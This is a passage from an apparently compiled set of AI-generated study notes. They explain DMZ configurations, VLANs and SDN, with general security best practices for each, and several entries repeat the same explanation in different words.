<p><strong>Web Server DMZ</strong>:</p>
<ul>
<li><strong>Description</strong>: In this setup, the DMZ hosts web servers that are accessible from the internet. These web servers typically serve public-facing websites, web applications, or APIs. The DMZ is isolated from the internal network, and incoming traffic from the internet is filtered and forwarded to the web servers.</li>
<li><strong>Configuration</strong>: The DMZ is typically implemented using a firewall or a dedicated DMZ appliance. Inbound traffic from the internet is allowed through the firewall to reach the web servers in the DMZ, while access to internal resources is restricted. The web servers may be further protected by intrusion detection/prevention systems (IDS/IPS) and web application firewalls (WAFs).</li>
</ul>
</li>
<li>
<p><strong>Email Server DMZ</strong>:</p>
<ul>
<li><strong>Description</strong>: In this setup, the DMZ hosts email servers responsible for receiving and sending emails to and from the internet. The email servers handle incoming SMTP (Simple Mail Transfer Protocol) traffic from external email servers and outgoing email traffic from internal users.</li>
<li><strong>Configuration</strong>: Similar to the web server DMZ, the email server DMZ is isolated from the internal network using a firewall or DMZ appliance. Incoming SMTP traffic from the internet is allowed through the firewall to reach the email servers in the DMZ. Security measures such as anti-spam filters, antivirus scanners, and email encryption may be implemented to protect the email servers and prevent email-based threats.</li>
</ul>
</li>
<li>
<p><strong>FTP Server DMZ</strong>:</p>
<ul>
<li><strong>Description</strong>: In this setup, the DMZ hosts FTP (File Transfer Protocol) servers that allow users to upload and download files securely over the internet. The FTP servers may be used for file sharing, data exchange, or remote file storage.</li>
<li><strong>Configuration</strong>: The DMZ is configured to allow FTP traffic from the internet to reach the FTP servers while restricting access to internal resources. Access controls, encryption, and user authentication mechanisms are implemented to secure file transfers and prevent unauthorized access to sensitive data. Additionally, intrusion detection systems may be deployed to monitor for suspicious FTP activity.</li>
</ul>
</li>
<li>
<p><strong>Application Gateway DMZ</strong>:</p>
<ul>
<li><strong>Description</strong>: In this setup, the DMZ hosts application gateways or proxies that provide secure access to internal applications or services from external users or partners. The application gateways act as intermediaries, inspecting and forwarding application traffic while enforcing security policies.</li>
<li><strong>Configuration</strong>: The DMZ is configured to allow incoming traffic from the internet to reach the application gateways, which then proxy requests to the appropriate internal servers or services. Access controls, authentication, and encryption are implemented to secure communication between external users and internal resources. Application firewalls may also be deployed to inspect and filter application traffic for security threats.</li>
</ul>
</li>
</ol>
<p>These are just a few examples of DMZ configurations commonly used to enhance network security and protect internal resources from external threats. Each DMZ setup is tailored to the specific requirements and security policies of the organization, balancing accessibility with security considerations.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vlan"><a class="header" href="#vlan">VLAN</a></h1>
<p>GitHub Copilot: A VLAN, or Virtual Local Area Network, is a method of creating independent networks within a network. These independent networks cannot communicate with each other without a router, even if they share the same physical network infrastructure.</p>
<p>Here's a simplified explanation of how it works:</p>
<ol>
<li>Network devices in the same VLAN communicate with each other as if they were on a separate physical network.</li>
<li>Devices in different VLANs cannot communicate directly with each other. They must communicate through a router or a layer 3 switch.</li>
<li>VLANs improve network performance by limiting the broadcast domain (the set of all devices that will receive broadcast frames originating from any device within the set).</li>
<li>VLANs enhance security by limiting the visibility of traffic to only the devices in the same VLAN.</li>
</ol>
<p>Remember, as an AI programming assistant, my expertise is in software development. For more detailed information about network infrastructure and VLANs, you may want to consult resources or experts in those areas.</p>
<p>A VLAN, or Virtual Local Area Network, is a method of creating independent networks within a network. It is a logical grouping of network devices that are not restricted by physical location. Devices in the same VLAN can communicate with each other as if they were on a separate physical network, even if they share the same physical network infrastructure. Devices in different VLANs cannot communicate directly with each other. They must communicate through a router or a layer 3 switch.</p>
<p>A VLAN, or Virtual Local Area Network, is a network segmentation technique that allows network administrators to logically divide a physical network into multiple, isolated virtual networks. These virtual networks operate as if they are independent from each other, even though they may share the same physical infrastructure. VLANs are often used to enhance network security, optimize network performance, and simplify network management.</p>
<p>Here's how VLANs work:</p>
<ol>
<li>
<p><strong>Logical Segmentation:</strong> VLANs enable the logical segmentation of a physical network into multiple virtual networks. Each VLAN is identified by a unique VLAN ID, which is a numerical identifier that distinguishes it from other VLANs in the same network.</p>
</li>
<li>
<p><strong>Switch Configuration:</strong> VLANs are typically implemented at the switch level. Network switches are configured to recognize and forward traffic based on VLAN IDs. Ports on the switch are assigned to specific VLANs, and devices connected to those ports become part of the corresponding VLAN.</p>
</li>
<li>
<p><strong>Isolation of Broadcast Domains:</strong> One of the primary benefits of VLANs is the isolation of broadcast domains. In a traditional network, all devices connected to the same physical network segment receive each other's broadcast traffic. VLANs, however, allow you to create separate broadcast domains, reducing unnecessary broadcast traffic and improving network efficiency.</p>
</li>
<li>
<p><strong>Inter-VLAN Routing:</strong> By default, devices within the same VLAN can communicate with each other, but communication between devices in different VLANs is restricted. To enable communication between VLANs, a router or Layer 3 switch is required to perform inter-VLAN routing. This router connects to each VLAN and routes traffic between them.</p>
</li>
<li>
<p><strong>Flexibility and Scalability:</strong> VLANs provide flexibility in network design and scalability. Administrators can easily reconfigure VLAN assignments as needed without physically relocating devices or rewiring the network. This flexibility is especially valuable in large and dynamic network environments.</p>
</li>
<li>
<p><strong>Enhanced Security:</strong> VLANs enhance network security by segregating different types of traffic and isolating sensitive data. For example, a company might create separate VLANs for different departments, ensuring that the finance department's traffic is isolated from the marketing department's traffic.</p>
</li>
<li>
<p><strong>QoS (Quality of Service):</strong> VLANs can be used to prioritize certain types of traffic by assigning different priority levels to different VLANs. This is particularly useful for ensuring that critical applications receive the necessary bandwidth and resources.</p>
</li>
<li>
<p><strong>Management and Troubleshooting:</strong> VLANs simplify network management by allowing administrators to organize and manage devices based on logical groupings rather than physical locations. Troubleshooting and network maintenance can be more efficient with VLANs, as changes can be made without affecting the entire network.</p>
</li>
</ol>
<p>In summary, VLANs provide a way to create logical network segments within a physical network, offering benefits such as improved security, network efficiency, and flexibility in network design.</p>
<p>A <strong>Virtual LAN (VLAN)</strong> is a logical subnetwork that groups a collection of devices from different physical LANs³. VLAN technology enables network architects to segment physical devices into logical subgroups for performance and security reasons¹.</p>
<p>Here's how a VLAN works:</p>

<p>A VLAN (Virtual Local Area Network) is a logical grouping of devices on a physical LAN (Local Area Network) that functions as a separate broadcast domain. It allows network administrators to segment a physical network into multiple logical networks based on shared characteristics, such as function, department, or security requirements. This segmentation enhances network security, improves performance, and simplifies network management.</p>
<p><strong>How VLANs Work</strong></p>
<p>VLANs operate at the Data Link Layer (Layer 2) of the OSI model, which is responsible for frame transmission and addressing. To create a VLAN, network administrators assign a VLAN ID (VID) to each device or port on the physical network. Devices with the same VID are considered part of the same VLAN, while devices with different VIDs are considered part of different VLANs.</p>
<p>Switches play a crucial role in implementing VLANs. They are responsible for tagging each Ethernet frame with its corresponding VLAN ID, ensuring that frames are only forwarded to devices within the same VLAN. This prevents broadcast traffic from flooding the entire network, reducing network congestion and improving performance.</p>
<p><strong>Types of VLANs</strong></p>
<p>There are two main types of VLANs:</p>
<ol>
<li>
<p><strong>Port-based VLANs:</strong> These VLANs are configured based on the physical ports on a switch. Each port is assigned to a specific VLAN, and all devices connected to that port automatically become part of that VLAN.</p>
</li>
<li>
<p><strong>MAC-based VLANs:</strong> These VLANs are configured based on the Media Access Control (MAC) addresses of devices. Devices are assigned to VLANs based on their MAC addresses, regardless of the port they are connected to.</p>
</li>
</ol>
<p><strong>Benefits of Using VLANs</strong></p>
<ul>
<li>
<p><strong>Enhanced Security:</strong> VLANs isolate broadcast traffic to specific groups of devices, preventing unauthorized access and reducing the potential impact of security breaches.</p>
</li>
<li>
<p><strong>Improved Performance:</strong> By segmenting the network, VLANs reduce broadcast traffic and improve overall network performance.</p>
</li>
<li>
<p><strong>Simplified Network Management:</strong> VLANs simplify network management by allowing administrators to group devices based on shared characteristics, making it easier to configure and manage network resources.</p>
</li>
<li>
<p><strong>Flexibility:</strong> VLANs can be dynamically changed and adapted to changing network requirements, providing flexibility for evolving network needs.</p>
</li>
</ul>
<p><strong>Examples of VLAN Usage</strong></p>
<ul>
<li>
<p><strong>Separating Departments:</strong> Different departments within an organization can be placed into separate VLANs to restrict access to sensitive data and resources.</p>
</li>
<li>
<p><strong>Isolating Guest Networks:</strong> Guest networks can be isolated from the internal network using VLANs to prevent unauthorized access to sensitive information.</p>
</li>
<li>
<p><strong>Prioritizing Traffic:</strong> VLANs can be used to prioritize traffic based on importance, ensuring that critical applications receive preferential treatment.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>VLANs are a powerful tool for enhancing network security, improving performance, and simplifying network management. By segmenting networks logically, VLANs provide a flexible and effective approach to managing network resources and addressing the diverse needs of modern networks.</p>

<p>Virtual LANs (VLANs) offer a way to segment your network into logical subnets, even if they reside on the same physical infrastructure. While VLANs provide several benefits for network organization and traffic management, security is a crucial aspect to consider. Here's a breakdown of VLAN security best practices:</p>
<p><strong>Securing Your VLANs:</strong></p>
<ul>
<li><strong>Limiting Broadcast Traffic:</strong>  By segmenting your network with VLANs, you can significantly reduce broadcast traffic within your network. This can improve overall network performance and security by limiting the reach of potential malicious broadcasts.</li>
<li><strong>VLAN Access Control Lists (ACLs):</strong> Implement ACLs on your network switches to control traffic flow between VLANs.  These ACLs can define which VLANs can communicate with each other and restrict unauthorized traffic movement.</li>
<li><strong>Strong Port Security:</strong>  Configure switch ports with strong security measures. This includes features like Port Security (limiting the number of allowed MAC addresses) and Dynamic VLAN Assignment (restricting unauthorized devices from joining a VLAN).</li>
<li><strong>Avoid Untagged Traffic:</strong> When possible, avoid using untagged traffic on trunk ports connecting switches. Untagged traffic can potentially bypass VLAN restrictions if not configured correctly.</li>
<li><strong>Monitoring and Logging:</strong>  Enable monitoring and logging on your network switches to track VLAN activity and identify suspicious behavior. This can help detect potential security incidents like unauthorized access attempts.</li>
</ul>
<p><strong>Additional VLAN Security Considerations:</strong></p>
<ul>
<li><strong>VLAN Hopping:</strong>  Be aware of VLAN hopping vulnerabilities. Attackers might exploit weaknesses in VLAN implementations to gain access to unauthorized VLANs. Implementing strong switch security and proper network segmentation can mitigate this risk.</li>
<li><strong>Management VLAN:</strong>  Create a separate, isolated VLAN for network management devices like switches and firewalls. This helps prevent attackers from compromising management devices and manipulating your VLAN configuration.</li>
<li><strong>Device Security:</strong>  Security measures are not limited to the VLAN configuration itself.  Ensure individual devices within each VLAN are secure with up-to-date software, strong passwords, and appropriate access controls.</li>
</ul>
<p><strong>Benefits of Secure VLANs:</strong></p>
<ul>
<li><strong>Improved Network Security:</strong> Secure VLAN segmentation creates barriers within your network, limiting the impact of a security breach in one VLAN from spreading to others.</li>
<li><strong>Enhanced Performance:</strong> By reducing broadcast traffic and segmenting network usage, VLANs can contribute to improved overall network performance.</li>
<li><strong>Simplified Network Management:</strong> VLANs can simplify network management by grouping devices logically based on function or department.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>VLANs are a valuable tool for network organization, but security should be a top priority. By following these best practices and implementing strong security measures, you can leverage VLANs to create a more secure and manageable network environment. Remember, VLAN security is an ongoing process that requires continuous monitoring, adaptation, and awareness of potential threats.</p>
<p>VLANs (Virtual Local Area Networks) are a common method used to segment network traffic within a single physical network infrastructure. While VLANs offer benefits such as improved network performance, enhanced security, and simplified network management, they also introduce security considerations that need to be addressed. Here are some key security considerations for VLANs:</p>
<ol>
<li>
<p><strong>Proper VLAN Segmentation</strong>: Ensure that VLANs are logically segmented based on the organization's security requirements and network architecture. Group devices with similar security profiles and access requirements into separate VLANs to minimize the risk of unauthorized access or lateral movement within the network.</p>
</li>
<li>
<p><strong>VLAN Access Controls</strong>: Implement access controls to restrict communication between VLANs and control access to network resources based on user roles, permissions, or security policies. Use VLAN ACLs (Access Control Lists), firewall rules, or network segmentation technologies such as VLAN-aware firewalls to enforce policy-based access controls and prevent unauthorized traffic flows between VLANs.</p>
</li>
<li>
<p><strong>VLAN Trunking Security</strong>: Secure VLAN trunk links that interconnect switches and carry traffic between VLANs to prevent VLAN hopping attacks and unauthorized access to VLANs. Configure trunk ports to allow only authorized VLANs, enable VLAN pruning to remove unused VLANs from trunk links, and implement VLAN tagging (802.1Q) to label VLAN traffic and ensure proper segregation.</p>
</li>
<li>
<p><strong>VLAN Native VLAN Configuration</strong>: Avoid using the default/native VLAN (VLAN 1) for user data traffic or sensitive network traffic to mitigate VLAN hopping and VLAN spoofing attacks. Configure unused ports and trunk links with a dedicated VLAN for management traffic or assign them to an unused VLAN to prevent unauthorized access.</p>
</li>
<li>
<p><strong>VLAN Management Security</strong>: Secure VLAN management interfaces, such as VLAN configuration interfaces on switches or VLAN management software, to prevent unauthorized configuration changes, VLAN manipulation, or VLAN reconnaissance by attackers. Implement strong authentication mechanisms, access controls, and audit trails for VLAN management activities.</p>
</li>
<li>
<p><strong>VLAN Monitoring and Logging</strong>: Monitor VLAN traffic and logging activities to detect and respond to security incidents, anomalies, or policy violations within VLANs. Use network monitoring tools, intrusion detection/prevention systems (IDS/IPS), or security information and event management (SIEM) solutions to monitor VLAN traffic for signs of malicious activity and generate alerts or reports for further investigation.</p>
</li>
<li>
<p><strong>Regular Vulnerability Assessments</strong>: Conduct regular vulnerability assessments and security audits of VLAN configurations, access controls, and network segmentation policies to identify and remediate security weaknesses. Assess VLAN security posture, compliance with security standards, and adherence to best practices to ensure robust protection against emerging threats and vulnerabilities.</p>
</li>
<li>
<p><strong>Employee Training and Awareness</strong>: Provide security awareness training and education to network administrators, IT staff, and end-users about VLAN security best practices, potential threats, and security risks associated with misconfigured VLANs. Promote a culture of security awareness and vigilance to prevent accidental misconfigurations or security breaches.</p>
</li>
</ol>
<p>By addressing these security considerations, organizations can strengthen the security posture of their VLAN deployments, minimize the risk of unauthorized access or data breaches, and ensure compliance with industry regulations and security standards. VLANs play a critical role in network segmentation and access control, and proper security measures are essential to protect sensitive data and maintain the confidentiality, integrity, and availability of network resources.</p>

<p>VLANs (Virtual Local Area Networks) offer a powerful approach to network segmentation, dividing your physical network into logical subnets. This segregation enhances security, improves network performance, and simplifies network management. Here are some real-world examples of how VLANs can be utilized:</p>
<p><strong>Scenario 1: Segmenting a Corporate Network</strong></p>
<ul>
<li>A large corporation has various departments (Finance, Marketing, Sales) with different security requirements and network traffic patterns.</li>
<li>The network administrator implements VLANs to segment the network.</li>
<li>The Finance department gets its own VLAN for secure access to financial applications and data servers. </li>
<li>The Marketing and Sales departments might share another VLAN for general internet access and collaboration tools.</li>
<li>This VLAN segmentation restricts unauthorized access between departments, improving data security and reducing unnecessary traffic flow across the network.</li>
</ul>
<p><strong>Scenario 2: Isolating Guest Traffic</strong></p>
<ul>
<li>A company offers Wi-Fi access to guests visiting their office.</li>
<li>To isolate guest traffic from the company's internal network, a separate VLAN is created for guest Wi-Fi access points.</li>
<li>Guest users can connect to the internet through the guest VLAN but wouldn't have access to internal resources like file servers or printers.</li>
<li>This approach safeguards the company's internal network from potential security risks introduced by guest devices.</li>
</ul>
<p><strong>Scenario 3: Securing a Network with IoT Devices</strong></p>
<ul>
<li>A company deploys various Internet of Things (IoT) devices within their office, such as smart sensors or printers.</li>
<li>To isolate potential security risks from these devices, a dedicated VLAN is created for IoT devices.</li>
<li>This VLAN segmentation prevents uncontrolled communication between IoT devices and other critical systems on the network, mitigating potential security vulnerabilities.</li>
</ul>
<p><strong>Benefits of VLANs in these Examples:</strong></p>
<ul>
<li><strong>Enhanced Security:</strong>  VLAN segmentation creates isolated network segments, restricting unauthorized access and preventing security breaches in one segment from impacting others. </li>
<li><strong>Improved Performance:</strong> By reducing unnecessary broadcast traffic and segmenting network usage based on function, VLANs can contribute to a more efficient and responsive network.</li>
<li><strong>Simplified Management:</strong>  VLANs allow for grouping devices logically based on department, function, or security requirements. This simplifies network management and access control policies.</li>
</ul>
<p><strong>Additional VLAN Use Cases:</strong></p>
<ul>
<li><strong>Segmenting a Network by Device Type:</strong>  Separate VLANs can be created for servers, desktops, VoIP phones, or security cameras, depending on network traffic patterns and security needs.</li>
<li><strong>Isolating Public-Facing Servers:</strong>  A VLAN can be used to isolate web servers or DMZ (Demilitarized Zone) servers from the internal network, enhancing security for internet-facing services.</li>
<li><strong>Creating a VLAN for Voice over IP (VoIP):</strong>  A dedicated VLAN can be used for VoIP traffic to prioritize voice quality and ensure smooth operation of your phone system.</li>
</ul>
<p><strong>Remember:</strong> The specific VLAN configuration will depend on your network's size, complexity, and security requirements. Carefully consider your needs when designing and implementing VLANs for optimal network security and performance.</p>
<p>Here are some common examples of VLAN implementations:</p>
<ol>
<li>
<p><strong>Departmental Segmentation</strong>:</p>
<ul>
<li><strong>Description</strong>: In an enterprise network, different departments such as HR, finance, IT, and marketing may have distinct network requirements and security policies. VLANs can be used to segment network traffic by department, allowing each department to operate within its own VLAN with dedicated resources and access controls.</li>
<li><strong>Configuration</strong>: Assign each department to a separate VLAN, ensuring that devices within each VLAN can communicate with each other while restricting communication between VLANs. For example, HR devices might be in VLAN 10, finance devices in VLAN 20, and so on. Apply VLAN access controls to enforce policies and control inter-departmental communication.</li>
</ul>
</li>
<li>
<p><strong>Guest Wi-Fi Network</strong>:</p>
<ul>
<li><strong>Description</strong>: In a business or hospitality setting, it's common to provide guest Wi-Fi access separate from the corporate network to ensure security and compliance. VLANs can be used to isolate guest Wi-Fi traffic from the internal network, preventing unauthorized access to sensitive resources.</li>
<li><strong>Configuration</strong>: Create a dedicated VLAN for guest Wi-Fi traffic, separate from the VLAN used for corporate Wi-Fi or wired connections. Apply appropriate access controls and firewall rules to restrict guest traffic from accessing internal resources while allowing internet access. Use captive portal authentication or guest access passwords to control guest Wi-Fi access.</li>
</ul>
</li>
<li>
<p><strong>Voice and Data Segregation</strong>:</p>
<ul>
<li><strong>Description</strong>: Voice-over-IP (VoIP) traffic has specific quality of service (QoS) requirements and may need to be prioritized over data traffic for optimal performance. VLANs can be used to separate voice and data traffic, ensuring quality voice communication while maintaining network efficiency.</li>
<li><strong>Configuration</strong>: Configure separate VLANs for voice and data traffic, with voice traffic prioritized using QoS mechanisms such as IEEE 802.1p or Differentiated Services (DiffServ). Ensure that voice VLANs have sufficient bandwidth and low latency to support VoIP applications effectively. Implement VLAN tagging on switches and routers to differentiate voice and data traffic.</li>
</ul>
</li>
<li>
<p><strong>Server Farm or Data Center Segmentation</strong>:</p>
<ul>
<li><strong>Description</strong>: In a data center environment, different server clusters or application tiers may require separate network segments for security, performance, or compliance reasons. VLANs can be used to segment servers based on their role or application, isolating critical services from less sensitive ones.</li>
<li><strong>Configuration</strong>: Create VLANs for different server clusters, application tiers, or security zones within the data center. Implement VLAN access controls and firewall policies to restrict traffic flow between VLANs based on security requirements. Use VLAN tagging and trunking to ensure proper communication between servers and external networks.</li>
</ul>
</li>
<li>
<p><strong>IoT Device Isolation</strong>:</p>
<ul>
<li><strong>Description</strong>: Internet of Things (IoT) devices such as smart sensors, cameras, and thermostats may introduce security risks if connected to the same network as critical systems. VLANs can be used to isolate IoT devices from the corporate network, reducing the attack surface and protecting sensitive assets.</li>
<li><strong>Configuration</strong>: Deploy dedicated VLANs for IoT devices, segregating them from the corporate network and other critical infrastructure. Apply strict access controls and firewall rules to restrict communication between IoT VLANs and internal resources. Monitor IoT VLAN traffic for anomalies and security threats.</li>
</ul>
</li>
</ol>
<p>These examples demonstrate how VLANs can be used to segment network traffic, improve security, and optimize network performance in various environments and use cases. VLAN implementations should be carefully planned and configured to meet specific requirements and align with organizational security policies and best practices.</p>

<p>GitHub Copilot: SDN, or Software-Defined Networking, is an approach to network management that allows dynamic, programmatically efficient network configuration in order to improve network performance and monitoring.</p>
<p>Here's a simplified explanation of how it works:</p>
<ol>
<li>SDN separates the network's control (brains) and forwarding (muscle) planes to make it easier to optimize each.</li>
<li>The SDN Controller is a centralized program or application that manages the flow of packets on a network.</li>
<li>The network devices (like switches and routers), which forward traffic, become simple forwarding devices and do not need to understand networking protocols.</li>
<li>The SDN Controller tells the network devices where to send packets. The devices just forward the packets as instructed.</li>
<li>This allows for more centralized and programmable control, and the network can be quickly reconfigured to adapt to changing needs.</li>
</ol>
<p>Remember, as an AI programming assistant, my expertise is in software development. For more detailed information about network infrastructure and SDNs, you may want to consult resources or experts in those areas.</p>
<p>SDN, or Software-Defined Networking, is an innovative approach to network management that allows network administrators to control and manage network resources through software applications rather than relying on traditional network infrastructure devices. SDN separates the control plane (where network decisions are made) from the data plane (where data is forwarded), providing a more flexible and programmable network architecture.</p>
<p>Here's how SDN generally works:</p>
<ol>
<li>
<p><strong>Separation of Control and Data Planes:</strong></p>
<ul>
<li><strong>Control Plane:</strong> In SDN, the control plane is centralized and managed by a software application called the SDN controller. The controller communicates with the networking devices in the infrastructure to make decisions about how data should be forwarded.</li>
<li><strong>Data Plane:</strong> The data plane remains distributed and consists of network devices such as switches and routers. These devices are responsible for forwarding data based on the decisions made by the centralized SDN controller.</li>
</ul>
</li>
<li>
<p><strong>SDN Controller:</strong></p>
<ul>
<li>The SDN controller is a critical component of the SDN architecture. It acts as the &quot;brain&quot; of the network, making decisions about how to handle network traffic based on high-level policies and instructions received from the network administrator or applications.</li>
<li>The controller communicates with network devices using a standardized protocol such as OpenFlow. OpenFlow is often associated with SDN and is used to communicate between the SDN controller and the networking devices.</li>
</ul>
</li>
<li>
<p><strong>Programmability and Automation:</strong></p>
<ul>
<li>SDN allows for greater programmability and automation of network tasks. Network administrators can use software applications to define policies and make changes to the network dynamically without having to manually configure individual devices.</li>
<li>This programmability enables the network to adapt to changing conditions, optimize traffic flow, and respond to specific application requirements.</li>
</ul>
</li>
<li>
<p><strong>Centralized Network Management:</strong></p>
<ul>
<li>With SDN, network management is centralized, making it easier to implement changes and enforce policies across the entire network. This centralized control simplifies network administration tasks and reduces the complexity associated with managing traditional, distributed networks.</li>
</ul>
</li>
<li>
<p><strong>Dynamic Traffic Engineering:</strong></p>
<ul>
<li>SDN enables dynamic traffic engineering, allowing administrators to optimize network resources based on real-time conditions. The SDN controller can make decisions about routing paths and allocate bandwidth dynamically, improving overall network performance and efficiency.</li>
</ul>
</li>
<li>
<p><strong>Open APIs and Standards:</strong></p>
<ul>
<li>SDN promotes the use of open APIs (Application Programming Interfaces) and standards, allowing third-party applications and tools to interact with the SDN controller. This openness encourages innovation and the development of a diverse ecosystem of SDN applications.</li>
</ul>
</li>
<li>
<p><strong>Flexibility and Scalability:</strong></p>
<ul>
<li>SDN provides flexibility and scalability by decoupling the control plane from the underlying hardware. This means that network administrators can scale and adapt the network more easily to meet changing business requirements.</li>
</ul>
</li>
</ol>
<p>SDN is particularly valuable in dynamic and large-scale network environments where agility, scalability, and efficient resource utilization are crucial. It has applications in data centers, wide-area networks (WANs), and service provider networks, among other areas.</p>
<p><strong>Software-Defined Networking (SDN)</strong> is an approach to networking that uses software controllers, which can be driven by application programming interfaces (APIs), to communicate with hardware infrastructure to direct network traffic¹. It creates and operates a series of virtual overlay networks that work in conjunction with a physical underlay network¹.</p>
<p>Here's how SDN works:</p>
<ol>
<li>SDN uses algorithms to automate device configuration and management³.</li>
<li>It can scale operations according to evolving network requirements, regardless of the number of devices connected to the network³.</li>
<li>SDN strips away the routing and packet forwarding functions, known as the control plane, from the data plane, or underlying infrastructure¹.</li>
<li>SDN then implements controllers, considered the brain of the SDN network, and layers them above the network hardware in the cloud or on-premises¹.</li>
<li>Open-source technologies, such as OpenFlow, direct traffic among network devices in an SDN network¹.</li>
</ol>
<p>The components used to build a software-defined network may or may not be located in the same physical area. These include¹:</p>
<ul>
<li><strong>Applications</strong>: Tasked with relaying information about the network or requests for specific resource availability or allocation.</li>
<li><strong>SDN controllers</strong>: Handle communication with the apps to determine the destination of data packets. The controllers are the load balancers within SDN.</li>
<li><strong>Networking devices</strong>: Receive instructions from the controllers regarding how to route the packets.</li>
<li><strong>Open-source technologies</strong>: Programmable networking protocols, such as OpenFlow, direct traffic among network devices in an SDN network.</li>
</ul>
<p>In summary, SDN provides a simpler, centralized way to manage networks, offering efficient control of traffic and the ability to scale as needed¹²³⁴.</p>

<p>SDN (Software-Defined Networking) is a network architecture that separates the control plane from the data plane of the network. The control plane is responsible for making decisions about how traffic should flow through the network, while the data plane is responsible for forwarding traffic according to the instructions from the control plane.</p>
<p><strong>How SDN Works</strong></p>
<p>In a traditional network, the control plane and data plane are tightly coupled together. This makes it difficult to manage and control the network, as changes to the control plane can have a significant impact on the data plane, and vice versa.</p>
<p>SDN decouples the control plane from the data plane, allowing the network to be managed in a more centralized and flexible way. The control plane, which is typically implemented on a software-based controller, is responsible for making decisions about how traffic should flow through the network. These decisions are then communicated to the data plane, which is typically implemented on network devices such as switches and routers.</p>
<p>The data plane is responsible for forwarding traffic according to the instructions from the control plane. This allows the network administrator to make changes to the control plane without having to touch the data plane, which can significantly simplify network management.</p>
<p><strong>Benefits of SDN</strong></p>
<p>There are several benefits to using SDN, including:</p>
<ul>
<li>
<p><strong>Improved network visibility:</strong> SDN provides a centralized view of the network, which makes it easier to troubleshoot problems and identify potential security threats.</p>
</li>
<li>
<p><strong>Increased network agility:</strong> SDN makes it easier to make changes to the network, which can help organizations respond more quickly to changing business needs.</p>
</li>
<li>
<p><strong>Reduced network costs:</strong> SDN can help organizations reduce network costs by automating network management tasks and optimizing network traffic flow.</p>
</li>
</ul>
<p><strong>Use Cases for SDN</strong></p>
<p>SDN can be used for a variety of use cases, including:</p>
<ul>
<li>
<p><strong>Data center networking:</strong> SDN is being used in data centers to improve the performance and scalability of cloud computing applications.</p>
</li>
<li>
<p><strong>WAN (Wide Area Network) optimization:</strong> SDN can be used to optimize traffic flow across WANs, which can improve the performance of applications that are deployed across multiple locations.</p>
</li>
<li>
<p><strong>Security:</strong> SDN can be used to implement security policies that are more granular and flexible than traditional security policies.</p>
</li>
</ul>
<p><strong>SDN is a complex and evolving technology, but it has the potential to revolutionize the way networks are managed and controlled. As SDN matures, it is likely to become increasingly important in the design and deployment of modern networks.</strong></p>
<p>Here is an example of how SDN can be used to improve network performance:</p>
<p>A network administrator wants to improve the performance of a cloud computing application that is hosted in a data center. The application is experiencing high latency because the traffic is being routed through multiple switches. The network administrator can use SDN to create a virtual network that is specifically designed for the application. This virtual network will have its own routing table, which will ensure that the traffic is routed through the most efficient path. As a result, the latency of the application will be reduced and the performance will improve.</p>
<p>SDN is still in its early stages of development, but it has the potential to significantly impact the way networks are designed, deployed, and managed in the future.</p>

<p>Software-Defined Networking (SDN) offers a dynamic and flexible approach to network management. However, this very flexibility introduces new security considerations. Here's a breakdown of SDN security best practices to achieve the benefits of SDN while mitigating potential risks:</p>
<p><strong>Securing Your SDN Environment:</strong></p>
<ul>
<li><strong>Securing the SDN Controller:</strong> The SDN controller acts as the brain of your SDN network. Implement robust security measures to protect it, such as strong authentication, access controls, and vulnerability management practices.</li>
<li><strong>Network Segmentation:</strong>  Leverage SDN's capabilities for granular network segmentation to isolate different parts of your network. This can help contain the spread of a security breach if it occurs.</li>
<li><strong>Policy Enforcement:</strong>  Carefully design and enforce security policies within the SDN controller. These policies should govern traffic flow, access control, and security measures across the network.</li>
<li><strong>Secure APIs:</strong>  Ensure the APIs used for communication between the SDN controller and network devices are secure. This includes proper authentication, authorization, and encryption mechanisms.</li>
<li><strong>Vulnerability Management:</strong>  Maintain a regular update schedule for the SDN controller and network devices to patch vulnerabilities promptly. </li>
<li><strong>Monitoring and Logging:</strong>  Enable comprehensive monitoring and logging within the SDN environment. This allows you to identify suspicious activity, potential security incidents, and configuration errors.</li>
</ul>
<p><strong>Additional SDN Security Considerations:</strong></p>
<ul>
<li><strong>Vendor Lock-in:</strong>  While SDN offers vendor neutrality, some solutions might lead to vendor lock-in for controllers or applications.  Carefully evaluate vendor security practices and potential lock-in scenarios before implementation.</li>
<li><strong>Security Expertise:</strong>  Implementing and managing a secure SDN environment requires a strong understanding of SDN principles and security best practices.  Consider training your IT team or seeking professional expertise if needed.</li>
<li><strong>Disaster Recovery:</strong>  Develop a comprehensive disaster recovery plan for your SDN environment. This plan should outline procedures for restoring network functionality in case of outages or security incidents.</li>
</ul>
<p><strong>Benefits of Secure SDN Security:</strong></p>
<ul>

By following these best practices and remaining vigilant about potential threats, you can leverage SDN to create a secure, dynamic, and adaptable network environment. Remember, SDN security is an ongoing process that requires continuous monitoring, adaptation, and investment in security expertise. </p>
<p>Software-Defined Networking (SDN) introduces a new approach to network management by decoupling the control plane from the data plane and centralizing network control. Security in SDN involves protecting the control plane, data plane, and management interfaces while ensuring the integrity, confidentiality, and availability of network resources. Here are some key security considerations and examples in SDN:</p>
<ol>
<li>
<p><strong>Control Plane Security</strong>:</p>
<ul>
<li><strong>Access Control</strong>: Limit access to the SDN controller and management interfaces to authorized administrators. Implement strong authentication mechanisms, such as multi-factor authentication (MFA) or certificate-based authentication, to verify the identity of users accessing the controller.</li>
<li><strong>Controller Security</strong>: Secure the SDN controller by regularly applying security patches and updates, implementing access controls, and hardening the underlying operating system. Use encryption to protect controller communication and ensure confidentiality of control plane traffic.</li>
<li><strong>Traffic Validation</strong>: Validate and authenticate control messages exchanged between the controller and network devices to prevent spoofing, tampering, or injection of malicious commands. Use message authentication codes (MACs) or digital signatures to verify the integrity and authenticity of control plane communication.</li>
</ul>
</li>
<li>
<p><strong>Data Plane Security</strong>:</p>
<ul>
<li><strong>Flow Security</strong>: Enforce security policies and access controls at the data plane level to regulate traffic flows and prevent unauthorized access to network resources. Use flow-based security mechanisms, such as access control lists (ACLs) or security groups, to filter and forward traffic based on predefined rules.</li>
<li><strong>Packet Inspection</strong>: Implement packet inspection and deep packet inspection (DPI) techniques to analyze network traffic for malicious content, anomalies, or security threats. Use intrusion detection/prevention systems (IDS/IPS) or application-aware firewalls to detect and block suspicious traffic at the data plane.</li>
</ul>
</li>
<li>
<p><strong>Management Plane Security</strong>:</p>
<ul>
<li><strong>Secure Protocols</strong>: Use secure management protocols, such as SSH (Secure Shell) or HTTPS, to encrypt management traffic and protect sensitive information exchanged between network management systems and SDN controllers.</li>
